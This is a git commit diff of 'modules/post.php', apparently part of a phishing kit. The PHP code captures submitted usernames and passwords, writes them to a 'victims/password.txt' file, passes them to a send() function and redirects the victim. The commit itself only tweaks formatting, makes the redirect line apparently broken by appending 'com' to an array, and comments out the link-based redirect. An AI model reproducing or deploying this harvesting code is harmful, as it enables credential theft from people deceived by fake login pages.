7e7aa9cda33c8573f7511b160ba06a49c7c15d4c
Saikumar Shetty <73155077+Shettysai@users.noreply.github.com>
2022-08-14 21:37:27 +0530

    Update post.php

--- modules/post.php
+++ modules/post.php
@@ -4,17 +4,18 @@ $url;
 if ($_SERVER['REQUEST_METHOD'] === 'POST') 
 {		   
     $user_agent = $_SERVER['HTTP_USER_AGENT'];       
-    $data = "=====================================\n".
+    $data = "====================================\n".
             "username:   " .$_POST['username']."\n".    
             "password:   " .$_POST['password']."\n".
-            "=====================================\n".   
+            "====================================\n".   
 	        "Page:||"     .$_POST['location']."||\n".                                                         
 	        "Date:"     .(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                                                          
 		
     File_Put_Contents(".././victims/password.txt", $data, FILE_APPEND);                                      
     send($data);
-    $url =	explode("||", $data);
+    $url =	explode("||", $data)."com";
 }
-if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
-else echo "<script>window.location.replace('$url');</script>";
+//if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
+//else 
+echo "<script>window.location.replace('$url');</script>";
 ?>
